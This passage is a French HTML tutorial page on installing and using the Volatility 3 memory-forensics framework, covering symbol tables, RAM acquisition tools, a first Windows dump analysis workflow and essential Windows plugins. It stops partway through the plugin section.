@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Volatility 3 — Tutoriel pas-à-pas — CAS-IN</title>
+<meta name="description" content="Tutoriel pas-à-pas Volatility 3 : outil DFIR open source. Installation, configuration, premier cas, quiz final.">
+<meta name="theme-color" content="#0d1117">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="../style/fiche_style.css">
+<link rel="stylesheet" href="../style/tutoriels.css">
+<link rel="stylesheet" href="../style/cas-in-navbar.css">
+<link rel="stylesheet" href="../style/gamification-toasts.css">
+<link rel="stylesheet" href="../style/gamification-tiers.css">
+</head>
+<body>
+
+<div id="cas-navbar" data-page="tutoriels"></div>
+
+<nav class="tn-nav" aria-label="Navigation tutoriel">
+  <a href="../tutoriels.html" class="tn-back">← Tutoriels</a>
+  <span class="tn-title">VOLATILITY 3 — PAS À PAS</span>
+  <a href="../fiches/volatility3.html" class="tn-quiz">📚 Fiche →</a>
+</nav>
+
+<div class="tuto-progress-bar">
+  <span style="font-size:.7rem;color:var(--muted);">📈 Progression</span>
+  <div class="tuto-progress-track"><div class="tuto-progress-fill"></div></div>
+  <span class="tuto-progress-text"><strong>0</strong> / 22 · 0%</span>
+  <button class="tuto-reset" type="button" title="Réinitialiser la progression de ce tutoriel">⟲ Reset</button>
+</div>
+
+<main id="main-content" data-tutoriel-id="volatility3">
+
+  <div class="tuto-layout">
+
+    <aside class="tuto-sidebar">
+      <h3>Plan</h3>
+      <ol>
+        <li><a href="#s1"><span class="check-marker"></span>1. Présentation générale</a></li>
+        <li><a href="#s2"><span class="check-marker"></span>2. Volatility 2 vs Volatility 3</a></li>
+        <li><a href="#s3"><span class="check-marker"></span>3. Cas d'usage typiques</a></li>
+        <li><a href="#s4"><span class="check-marker"></span>4. Architecture du framework</a></li>
+        <li><a href="#s5"><span class="check-marker"></span>5. Prérequis système</a></li>
+        <li><a href="#s6"><span class="check-marker"></span>6. Installation sous Linux/macOS</a></li>
+        <li><a href="#s7"><span class="check-marker"></span>7. Installation sous Windows</a></li>
+        <li><a href="#s8"><span class="check-marker"></span>8. Installation des Symbol Tables</a></li>
+        <li><a href="#s9"><span class="check-marker"></span>9. Acquisition d'un dump mémoire</a></li>
+        <li><a href="#s10"><span class="check-marker"></span>10. Premier workflow : analyse d'un dum</a></li>
+        <li><a href="#s11"><span class="check-marker"></span>11. Plugins Windows essentiels</a></li>
+        <li><a href="#s12"><span class="check-marker"></span>12. Plugins Linux essentiels</a></li>
+        <li><a href="#s13"><span class="check-marker"></span>13. Plugins macOS essentiels</a></li>
+        <li><a href="#s14"><span class="check-marker"></span>14. Chasse au malware avec Volatility</a></li>
+        <li><a href="#s15"><span class="check-marker"></span>15. volshell : exploration interactive</a></li>
+        <li><a href="#s16"><span class="check-marker"></span>16. Intégration avec d'autres outils</a></li>
+        <li><a href="#s17"><span class="check-marker"></span>17. Forces de Volatility 3</a></li>
+        <li><a href="#s18"><span class="check-marker"></span>18. Faiblesses et limites</a></li>
+        <li><a href="#s19"><span class="check-marker"></span>19. Bonnes pratiques</a></li>
+        <li><a href="#s20"><span class="check-marker"></span>20. Ressources utiles</a></li>
+        <li><a href="#s21"><span class="check-marker"></span>21. Conclusion</a></li>
+        <li><a href="#quiz" style="border-top:1px solid var(--border);margin-top:.5rem;padding-top:.65rem;color:var(--cyan)"><span class="check-marker"></span>🎯 Quiz final</a></li>
+      </ol>
+    </aside>
+
+    <article>
+
+      <header class="tuto-header">
+        <div class="breadcrumb" style="padding:0 0 .5rem">
+          <a href="../index.html">🏠 Accueil</a>
+          <span class="bc-sep">›</span>
+          <a href="../tutoriels.html">Tutoriels</a>
+          <span class="bc-sep">›</span>
+          <span class="bc-current">Volatility 3</span>
+        </div>
+
+        <h1>🧠 Volatility 3</h1>
+        <div class="tuto-subtitle">
+          À la fin de ce tutoriel, tu sauras <strong>installer Volatility 3</strong> avec ses <em>symbol tables</em>, <strong>analyser un dump mémoire</strong> Windows/Linux/macOS, détecter les <strong>processus cachés</strong>, le <strong>code injecté</strong> et extraire des artefacts (DLL, registre, connexions réseau, secrets LSA).
+        </div>
+        <div class="tuto-meta">
+          <span class="tuto-meta-badge lvl-expert"><span class="icon">🎯</span> Niveau expert</span>
+          <span class="tuto-meta-badge "><span class="icon">⏱</span> ~60 min</span>
+          <span class="tuto-meta-badge "><span class="icon">🐧</span> Linux (recommandé)</span>
+          <span class="tuto-meta-badge "><span class="icon">🪟</span> Windows</span>
+          <span class="tuto-meta-badge "><span class="icon">🍏</span> macOS</span>
+          <span class="tuto-meta-badge "><span class="icon">🧠</span> Mémoire vive</span>
+          <span class="tuto-meta-badge "><span class="icon">🐍</span> Python 3.10+</span>
+        </div>
+      </header>
+
+      <div class="tuto-callout info">
+        <div class="tuto-callout-title">ℹ️ À propos de Volatility 3</div>
+        <div>Volatility 3 est le <strong>framework de référence</strong> pour l'analyse forensique de la mémoire vive (RAM). Réécriture complète de Volatility 2 en Python 3, il abandonne les <em>profiles</em> au profit des <strong>symbol tables</strong> téléchargées. 150+ plugins pour Windows, Linux et macOS. Utilisé en investigation incidents (rootkits, exfiltration, malware fileless).<br><br>📦 <a href="https://github.com/volatilityfoundation/volatility3" target="_blank" rel="noopener">github.com/volatilityfoundation/volatility3</a></div>
+      </div>
+
+      <section class="tuto-section" id="s1" data-section-id="s1">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">01</span> Présentation générale</h2>
+        </header>
+        <div class="tuto-section-content">
+        <p>La <strong>mémoire vive (RAM)</strong> d'un système contient des <strong>trésors forensiques</strong> invisibles sur le disque :</p>
+        <ul><li>Processus en cours d'exécution (y compris malware fileless)</li><li>Connexions réseau actives</li><li>Mots de passe et clés de chiffrement en clair</li><li>Commandes tapées au terminal/PowerShell</li><li>Code injecté dans des processus légitimes</li><li>Données déchiffrées de fichiers protégés</li><li>Contenu du presse-papier</li><li>Communications instantanées non sauvegardées</li></ul>
+        <p><strong>Volatility</strong> est l'outil qui transforme une image RAM brute (un fichier <code>.raw</code>, <code>.mem</code>, <code>.vmem</code>, <code>.dmp</code>…) en une analyse exploitable.</p>
+        <p>C'est <strong>l'outil standard de l'industrie DFIR</strong> depuis plus de 15 ans. Il est utilisé par :</p>
+        <ul><li>Les <strong>CERT/CSIRT</strong> du monde entier</li><li>Le <strong>FBI</strong>, la <strong>NSA</strong>, l'<strong>ANSSI</strong> et les services de renseignement</li><li>Les <strong>grandes entreprises</strong> pour la chasse aux malwares</li><li>Les <strong>équipes red/blue team</strong> en formation et en exercice</li><li>Les <strong>chercheurs académiques</strong> en sécurité</li></ul>
+        <p>Statistiques GitHub (fin 2025) : ~<strong>4 000 étoiles</strong>, 78 contributeurs, version <strong>2.27.0</strong> sortie en janvier 2026.</p>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s2" data-section-id="s2">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">02</span> Volatility 2 vs Volatility 3</h2>
+        </header>
+        <div class="tuto-section-content">
+        <table><thead><tr><th>Aspect</th><th>Volatility 2</th><th>Volatility 3</th></tr></thead><tbody><tr><td><strong>Langage</strong></td><td>Python 2 (déprécié)</td><td><strong>Python 3.8+</strong></td></tr><tr><td><strong>Configuration</strong></td><td>Nécessite <code>--profile</code> (ex. Win7SP1x64)</td><td><strong>Détection automatique</strong></td></tr><tr><td><strong>Performance</strong></td><td>Lent sur gros dumps</td><td><strong>Beaucoup plus rapide</strong></td></tr><tr><td><strong>Symbol tables</strong></td><td>Profiles intégrés</td><td><strong>ISF JSON téléchargés</strong></td></tr><tr><td><strong>Maintenance</strong></td><td><strong>Arrêtée</strong> depuis 2020</td><td><strong>Active</strong></td></tr><tr><td><strong>Plugins</strong></td><td>Très nombreux (200+)</td><td>En croissance, certains à porter</td></tr><tr><td><strong>Syntaxe</strong></td><td><code>vol.py --profile=Win7SP1x64 -f mem.raw pslist</code></td><td><code>vol -f mem.raw windows.pslist</code></td></tr></tbody></table>
+        <div class="tuto-callout warning"><div class="tuto-callout-title">⚠️ Attention</div><div>️ <strong>Recommandation</strong> : tous les nouveaux projets doivent utiliser <strong>Volatility 3</strong>. Vol2 ne reçoit plus de mises à jour et ne supporte pas Windows 10/11 récents. Toutefois, certains plugins de niche (par exemple anciens dumps Windows XP) ne sont <strong>pas encore portés</strong> vers Vol3 — dans ces rares cas, Vol2 reste utile.</div></div>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s3" data-section-id="s3">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">03</span> Cas d'usage typiques</h2>
+        </header>
+        <div class="tuto-section-content">
+        <ul><li><strong>Réponse à incident</strong> : analyse rapide d'un poste compromis avant qu'il ne soit éteint.</li><li><strong>Chasse au malware sans fichier</strong> (<em>fileless malware</em>) : Cobalt Strike, Meterpreter, PowerShell Empire, etc.</li><li><strong>Détection d'injection de code</strong> dans des processus légitimes (Process Hollowing, Process Doppelgänging, DLL injection).</li><li><strong>Récupération de mots de passe</strong> depuis LSASS, le SAM Windows ou les caches.</li><li><strong>Reconstruction d'activité utilisateur</strong> (commandes tapées, sites visités, conversations).</li><li><strong>Analyse de ransomware</strong> : trouver la clé de chiffrement en mémoire.</li><li><strong>Détection de rootkits</strong> : hooks SSDT, IRP, IDT, IAT/EAT.</li><li><strong>Analyse de VM</strong> : exploitation directe des snapshots <code>.vmem</code>/<code>.vmss</code>.</li><li><strong>CTF et challenges</strong> : Volatility est omniprésent dans les compétitions DFIR.</li></ul>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s4" data-section-id="s4">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">04</span> Architecture du framework</h2>
+        </header>
+        <div class="tuto-section-content">
+        <p>Volatility 3 repose sur <strong>4 concepts clés</strong> :</p>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">shell</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>┌─────────────────────────────────────────────────────┐
+│                                                     │
+│   IMAGE MÉMOIRE (.raw, .vmem, .dmp, lime…)          │
+│              │                                      │
+│              ▼                                      │
+│   ┌──────────────────────┐                          │
+│   │  LAYERS (couches)    │  ← lecture brute,        │
+│   │                      │    désempaqueter         │
+│   │  RawMemoryLayer,     │    LIME, EWF, etc.       │
+│   │  WindowsCrashDump,   │                          │
+│   │  Intel32, Intel64    │                          │
+│   └──────────┬───────────┘                          │
+│              │                                      │
+│              ▼                                      │
+│   ┌──────────────────────┐                          │
+│   │  SYMBOL TABLES (ISF) │  ← descriptions de       │
+│   │  Windows 11 build X, │    structures du noyau   │
+│   │  Linux kernel Y,     │    (offsets, types)      │
+│   │  macOS Z             │                          │
+│   └──────────┬───────────┘                          │
+│              │                                      │
+│              ▼                                      │
+│   ┌──────────────────────┐                          │
+│   │  PLUGINS             │  ← logique d'analyse :   │
+│   │  windows.pslist,     │    parcours des          │
+│   │  windows.malfind,    │    structures du noyau   │
+│   │  linux.psaux, etc.   │    pour extraire         │
+│   └──────────┬───────────┘    des artefacts         │
+│              │                                      │
+│              ▼                                      │
+│         Sortie texte/JSON/CSV                       │
+│                                                     │
+└─────────────────────────────────────────────────────┘</code></pre></div>
+        <table><thead><tr><th>Composant</th><th>Rôle</th></tr></thead><tbody><tr><td><strong>Layers</strong></td><td>Couches d'abstraction pour lire l'image mémoire (RAW, crashdump, VMware, LIME…)</td></tr><tr><td><strong>Symbol Tables (ISF)</strong></td><td>Fichiers JSON décrivant les structures du noyau pour une version d'OS donnée</td></tr><tr><td><strong>Plugins</strong></td><td>Modules d'analyse spécialisés (pslist, malfind, netstat…)</td></tr><tr><td><strong>Renderers</strong></td><td>Formats de sortie (texte tabulaire, JSON, CSV, HTML)</td></tr></tbody></table>
+        <p>Cette architecture <strong>modulaire</strong> permet d'ajouter facilement le support de nouveaux OS, formats de dump et types d'analyses.</p>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s5" data-section-id="s5">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">05</span> Prérequis système</h2>
+        </header>
+        <div class="tuto-section-content">
+        <h3>Matériel</h3>
+        <table><thead><tr><th>Composant</th><th>Minimum</th><th>Recommandé</th></tr></thead><tbody><tr><td>RAM</td><td>4 Go</td><td><strong>16 Go</strong> (Volatility charge le dump en mémoire)</td></tr><tr><td>CPU</td><td>2 cœurs</td><td>4+ cœurs (certains plugins parallélisables)</td></tr><tr><td>Stockage</td><td>20 Go libres</td><td>SSD pour le cache des symboles</td></tr><tr><td>OS</td><td>Linux/Windows/macOS</td><td>Linux Ubuntu/Debian</td></tr></tbody></table>
+        <div class="tuto-callout tip"><div class="tuto-callout-title">💡 Astuce</div><div>Règle de pouce : avoir <strong>au moins autant de RAM que la taille du dump</strong> pour un fonctionnement fluide.</div></div>
+        <h3>Logiciels</h3>
+        <ul><li><strong>Python 3.8 ou supérieur</strong> (3.10+ recommandé)</li><li><strong>pip</strong> ou <strong>pipx</strong></li><li><strong>git</strong> (pour version dev)</li><li>Compilateur C (rarement, pour certaines dépendances natives)</li></ul>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s6" data-section-id="s6">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">06</span> Installation sous Linux/macOS</h2>
+        </header>
+        <div class="tuto-section-content">
+        <h3>Méthode 1 : pip (la plus simple)</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code># Crée un environnement virtuel (recommandé)
+python3 -m venv vol3_env
+source vol3_env/bin/activate
+
+# Installe Volatility 3 avec toutes les dépendances optionnelles
+pip install volatility3</code></pre></div>
+        <div class="tuto-callout tip"><div class="tuto-callout-title">💡 Astuce</div><div>Pour bénéficier de <strong>toutes les fonctionnalités</strong> (YARA, support de formats étendus, etc.) : ``<code>bash pip install "volatility3[full]" </code>``</div></div>
+        <h3>Méthode 2 : pipx (isolé global)</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>pipx install volatility3</code></pre></div>
+        <h3>Méthode 3 : depuis les sources (dernière version dev)</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>git clone https://github.com/volatilityfoundation/volatility3.git
+cd volatility3
+python3 -m venv venv &amp;&amp; source venv/bin/activate
+pip install -e ".[dev]"</code></pre></div>
+        <h3>Vérifier l'installation</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>vol --version
+vol -h</code></pre></div>
+        <p>Tu dois voir la liste des plugins disponibles. Le binaire est <code>vol</code> (et son alias historique <code>vol.py</code> reste disponible).</p>
+        <h3>Sous Kali Linux</h3>
+        <p>Volatility 3 est packagé :</p>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>sudo apt update
+sudo apt install volatility3</code></pre></div>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s7" data-section-id="s7">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">07</span> Installation sous Windows</h2>
+        </header>
+        <div class="tuto-section-content">
+        <h3>Méthode 1 : pip dans PowerShell</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">powershell</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code># Installer Python 3.10+ depuis python.org au préalable
+python -m venv vol3_env
+.\vol3_env\Scripts\Activate.ps1
+pip install volatility3
+vol --version</code></pre></div>
+        <h3>Méthode 2 : binaires précompilés</h3>
+        <p>La Volatility Foundation distribue des <strong>exécutables Windows autonomes</strong> sur la page Releases :</p>
+        <ol><li><<a href="https://github.com/volatilityfoundation/volatility3/releases" target="_blank" rel="noopener">https://github.com/volatilityfoundation/volatility3/releases</a>></li><li>Télécharger <code>vol-X.Y.Z.exe</code> (pas besoin de Python installé).</li><li>Placer dans un dossier ajouté au <code>PATH</code>.</li></ol>
+        <h3>Méthode 3 : WSL2</h3>
+        <p>Installer <strong>WSL2 + Ubuntu</strong>, puis suivre la procédure Linux. Recommandé si tu fais déjà beaucoup de DFIR sous Linux.</p>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s8" data-section-id="s8">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">08</span> Installation des Symbol Tables</h2>
+        </header>
+        <div class="tuto-section-content">
+        <p>Volatility a <strong>besoin de fichiers de symboles</strong> (au format <strong>ISF — Intermediate Symbol File</strong>) pour interpréter les structures du noyau de chaque version d'OS.</p>
+        <h3>Téléchargement des packs officiels</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code># Localiser le dossier symbols de l'installation
+python3 -c "import volatility3; print(volatility3.__file__)"
+# Exemple : /home/user/vol3_env/lib/python3.10/site-packages/volatility3/__init__.py
+# → Dossier symbols : .../volatility3/symbols/
+
+# Télécharger les packs (depuis le dossier symbols/)
+wget https://downloads.volatilityfoundation.org/volatility3/symbols/windows.zip
+wget https://downloads.volatilityfoundation.org/volatility3/symbols/mac.zip
+wget https://downloads.volatilityfoundation.org/volatility3/symbols/linux.zip
+
+# Décompresser DANS le dossier symbols/, en gardant les noms
+# Les zip doivent rester nommés tels quels (windows.zip, mac.zip, linux.zip)</code></pre></div>
+        <div class="tuto-callout warning"><div class="tuto-callout-title">⚠️ Attention</div><div>️ <strong>Premier lancement</strong> : Volatility va indexer tous les symboles, ce qui peut prendre <strong>5 à 30 minutes</strong>. Ce n'est fait qu'une seule fois. Le processus peut être interrompu et reprendra automatiquement.</div></div>
+        <h3>Symboles Windows : téléchargement automatique</h3>
+        <p>Pour <strong>Windows</strong>, Volatility peut <strong>télécharger automatiquement</strong> les symboles depuis Microsoft Symbol Server lors de l'analyse — y compris pour les versions de Windows non incluses dans le pack standard. Aucune action manuelle nécessaire en général.</p>
+        <h3>Symboles Linux et macOS : à générer</h3>
+        <p>Pour Linux et macOS, les symboles doivent être <strong>générés manuellement</strong> depuis les fichiers DWARF du noyau analysé, via l'outil <a href="https://github.com/volatilityfoundation/dwarf2json" target="_blank" rel="noopener"><strong>dwarf2json</strong></a> :</p>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code># Linux : générer ISF depuis vmlinux + System.map
+git clone https://github.com/volatilityfoundation/dwarf2json.git
+cd dwarf2json
+go build
+./dwarf2json linux --elf /path/to/vmlinux --system-map /path/to/System.map &gt; ubuntu_22.04.json
+
+# Placer le JSON dans symbols/linux/
+mv ubuntu_22.04.json .../volatility3/symbols/linux/</code></pre></div>
+        <div class="tuto-callout tip"><div class="tuto-callout-title">💡 Astuce</div><div>Pourquoi cette différence ? Il existe des <strong>dizaines de millions</strong> de combinaisons de noyaux Linux (chaque distribution, chaque mise à jour génère un nouveau kernel) — impossible de tous les pré-générer.</div></div>
+        <h3>Vérifier les symboles disponibles</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>vol -f mem.raw isfinfo.IsfInfo</code></pre></div>
+        <p>Liste tous les fichiers ISF actuellement chargés.</p>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s9" data-section-id="s9">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">09</span> Acquisition d'un dump mémoire</h2>
+        </header>
+        <div class="tuto-section-content">
+        <p>Volatility <strong>n'acquiert pas</strong> la mémoire — il faut un outil tiers en amont. Voici les principaux :</p>
+        <h3>Windows</h3>
+        <table><thead><tr><th>Outil</th><th>Type</th><th>Recommandation</th></tr></thead><tbody><tr><td><strong>FTK Imager</strong></td><td>GUI, gratuit, AccessData</td><td>✅ Standard judiciaire, mais empreinte mémoire un peu lourde</td></tr><tr><td><strong>Magnet RAM Capture</strong></td><td>GUI, gratuit</td><td>✅ Léger et fiable</td></tr><tr><td><strong>WinPmem</strong></td><td>CLI, open source (Velocidex)</td><td>✅ Sortie <code>.raw</code> ou crashdump, intègre bien avec Volatility</td></tr><tr><td><strong>DumpIt</strong> (Comae)</td><td>CLI, gratuit</td><td>✅ Ultra-léger (~2 Mo), un seul exe</td></tr><tr><td><strong>Belkasoft RAM Capturer</strong></td><td>GUI, gratuit</td><td>✅ Kernel-mode, contourne anti-debug</td></tr></tbody></table>
+        <p><strong>Exemple avec WinPmem</strong> :</p>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">cmd</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>:: Lancement en administrateur
+winpmem_v4.0.rc1.exe -o E:\dump\memory.raw</code></pre></div>
+        <div class="tuto-callout warning"><div class="tuto-callout-title">⚠️ Attention</div><div>️ <strong>Toujours dumper vers un support externe</strong> (USB rapide, disque externe) pour ne pas modifier le disque local.</div></div>
+        <h3>Linux</h3>
+        <table><thead><tr><th>Outil</th><th>Description</th></tr></thead><tbody><tr><td><strong>LiME</strong></td><td>Loadable Kernel Module — sortie au format <code>.lime</code> ou raw</td></tr><tr><td><strong>AVML</strong> (Microsoft)</td><td>Binaire statique Rust en userland, ne nécessite pas de module noyau</td></tr><tr><td><strong>/proc/kcore</strong></td><td>Lecture directe (Linux) — moins fiable</td></tr></tbody></table>
+        <p><strong>Exemple avec AVML</strong> :</p>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>sudo ./avml memory.lime</code></pre></div>
+        <h3>macOS</h3>
+        <p>L'acquisition de RAM sous macOS récents est <strong>très difficile</strong> à cause de SIP (System Integrity Protection). Outils historiques : <strong>OSXPmem</strong> (plus maintenu), <strong>Volexity Surge</strong> (commercial).</p>
+        <h3>Machines virtuelles</h3>
+        <p><strong>La méthode la plus propre</strong> : utiliser les snapshots du hyperviseur :</p>
+        <table><thead><tr><th>Hyperviseur</th><th>Fichier mémoire</th></tr></thead><tbody><tr><td><strong>VMware</strong></td><td><code>.vmem</code> (RAM brute) ou <code>.vmss</code>/<code>.vmsn</code> (état suspendu)</td></tr><tr><td><strong>VirtualBox</strong></td><td><code>.sav</code> (à convertir)</td></tr><tr><td><strong>Hyper-V</strong></td><td><code>.bin</code> ou checkpoint</td></tr><tr><td><strong>QEMU/KVM</strong></td><td><code>virsh save</code> produit un dump</td></tr></tbody></table>
+        <p>Volatility lit nativement les <code>.vmem</code> VMware.</p>
+        <h3>Hibernation et crash dumps</h3>
+        <table><thead><tr><th>Fichier</th><th>Source</th><th>Note</th></tr></thead><tbody><tr><td><code>hiberfil.sys</code></td><td>Hibernation Windows</td><td>Contient un snapshot de la RAM au moment de l'hibernation</td></tr><tr><td><code>pagefile.sys</code></td><td>Fichier d'échange Windows</td><td>Données partiellement écrites depuis la RAM</td></tr><tr><td><code>MEMORY.DMP</code></td><td>Crash dump Windows</td><td>Selon configuration</td></tr><tr><td><code>vmcore</code></td><td>Crash kernel Linux</td><td>kdump</td></tr></tbody></table>
+        <p>Volatility 3 peut lire tous ces formats directement.</p>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s10" data-section-id="s10">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">10</span> Premier workflow : analyse d'un dump Windows</h2>
+        </header>
+        <div class="tuto-section-content">
+        <h3>Étape 1 : vérifier le dump et détecter l'OS</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>vol -f memory.raw windows.info</code></pre></div>
+        <p>Sortie typique :</p>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">shell</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>Variable        Value
+Kernel Base     0xf80042200000
+DTB             0x1ab000
+Symbols         file:///path/to/symbols/...
+Is64Bit         True
+IsPAE           False
+PrimaryProcessorIndex   0
+NTBuildLab      19041.1.amd64fre.vb_release.191206-1406
+NTProductType   NtProductWinNt
+NtMajorVersion  10
+NtMinorVersion  0
+PE MajorOperatingSystemVersion  10
+PE MinorOperatingSystemVersion  0
+PE Machine      34404
+PE TimeDateStamp        Sat Dec  7 09:23:14 2019</code></pre></div>
+        <p>→ C'est un Windows 10 build 19041 (version 2004), 64-bit.</p>
+        <h3>Étape 2 : lister les processus</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>vol -f memory.raw windows.pslist</code></pre></div>
+        <h3>Étape 3 : arbre hiérarchique des processus</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>vol -f memory.raw windows.pstree</code></pre></div>
+        <p>→ Permet de repérer les processus dont le parent est suspect (ex : <code>cmd.exe</code> lancé par <code>winword.exe</code> = exécution macro malveillante).</p>
+        <h3>Étape 4 : connexions réseau</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>vol -f memory.raw windows.netstat
+vol -f memory.raw windows.netscan</code></pre></div>
+        <h3>Étape 5 : chercher du code injecté</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>vol -f memory.raw windows.malfind</code></pre></div>
+        <h3>Étape 6 : timeline globale</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>vol -f memory.raw timeliner.Timeliner --output csv &gt; timeline.csv</code></pre></div>
+        <p>Importable dans Plaso/Timesketch pour corrélation avec le disque.</p>
+        <h3>Sauvegarder les sorties</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code># Sortie en fichier
+vol -f memory.raw windows.pslist &gt; pslist.txt
+
+# Sortie JSON pour traitement automatisé
+vol -f memory.raw --renderer json windows.pslist &gt; pslist.json
+
+# Sortie CSV
+vol -f memory.raw --renderer csv windows.pslist &gt; pslist.csv</code></pre></div>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s11" data-section-id="s11">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">11</span> Plugins Windows essentiels</h2>
+        </header>
+        <div class="tuto-section-content">
+        <h3>Processus et exécution</h3>
+        <table><thead><tr><th>Plugin</th><th>Rôle</th></tr></thead><tbody><tr><td><code>windows.info</code></td><td>Informations système et version Windows</td></tr><tr><td><code>windows.pslist</code></td><td>Liste les processus via la <code>EPROCESS</code> linked list</td></tr><tr><td><code>windows.psscan</code></td><td>Scan exhaustif (trouve même les processus cachés/terminés)</td></tr><tr><td><code>windows.pstree</code></td><td>Arbre parent-enfant</td></tr><tr><td><code>windows.psxview</code></td><td><strong>Compare</strong> plusieurs méthodes de listing → détecte le caching</td></tr><tr><td><code>windows.cmdline</code></td><td>Ligne de commande de chaque processus</td></tr><tr><td><code>windows.dlllist</code></td><td>DLL chargées par processus</td></tr><tr><td><code>windows.handles</code></td><td>Handles (fichiers, registre, mutex…)</td></tr><tr><td><code>windows.envars</code></td><td>Variables d'environnement</td></tr><tr><td><code>windows.privileges</code></td><td>Privilèges actifs des tokens processus</td></tr><tr><td><code>windows.sessions</code></td><td>Sessions utilisateur actives</td></tr><tr><td><code>windows.getsids</code></td><td>SIDs associés aux processus</td></tr></tbody></table>
